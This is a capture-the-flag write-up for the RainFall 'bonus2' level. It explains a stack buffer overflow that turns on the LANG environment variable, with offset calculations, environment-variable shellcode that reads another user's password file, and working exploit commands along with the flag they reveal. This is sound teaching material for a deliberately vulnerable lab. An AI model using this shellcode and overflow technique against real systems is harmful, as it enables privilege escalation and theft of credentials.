# Write up

While dissassembling the program, we find that the greetuser function print depends of the LANG env variable :
```
bonus2@RainFall:~$ export LANG="nl"
bonus2@RainFall:~$ ./bonus2 1 5000
Goedemiddag! 1
(Global set to 2)
bonus2@RainFall:~$ export LANG="fi"
bonus2@RainFall:~$ ./bonus2 1 5000
Hyvää päivää 1
(Global set to 1)
bonus2@RainFall:~$ export LANG="fr"
bonus2@RainFall:~$ ./bonus2 1 5000
Hello 1
(Global unchanged (0), fr is not included in the checks)
```
One more time we have two buffers where we can overflow the first one on the second one.
We need to pad 40 bytes on the first buffer.
Depending of the language value, we get our segfault with different argv[2] size.
Overall we get a segfault with a full string of 72 chars, which fits with our pseudo code (88 bytes stack size - 16 bytes offset)
The fi language one lets us less "visible" bytes since it contains non-ASCII chars (unicode chars can took more than 1 byte)
Let's build our payload :
```
export LIDLCODE=$(python -c 'print "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/user/bonus3/.pass"')
echo 'void main(){printf("%p\n", getenv("LIDLCODE"));}' > /tmp/lidl12.c; gcc /tmp/lidl12.c -o /tmp/lidl12; chmod 777 /tmp/lidl12; /tmp/lidl12 // 0xbfffff67 here
// With LANG="fi"
$ ./bonus2 `python -c 'print "a" * 40'` `python -c 'print "b" * 18 + "\x67\xff\xff\xbf"'`
Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbg���
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
// With LANG="nl"
$ ./bonus2 `python -c 'print "a" * 40'` `python -c 'print "b" * 23 + "\x67\xff\xff\xbf"'`
Goedemiddag! aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbg���
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
Here we go.
Note that it doesn't work with the base Hello, it would need a payload like this :
```
$ ./bonus2 `python -c 'print "a" * 40'` `python -c 'print "b" * 30 + "\x67\xff\xff\xbf"'`
```
But the second string is clamped to 32 bytes. (Here we need 34, considering that since we overwrite the saved eip 4 bytes after the frame stack top, we need to actually write 80 bytes)
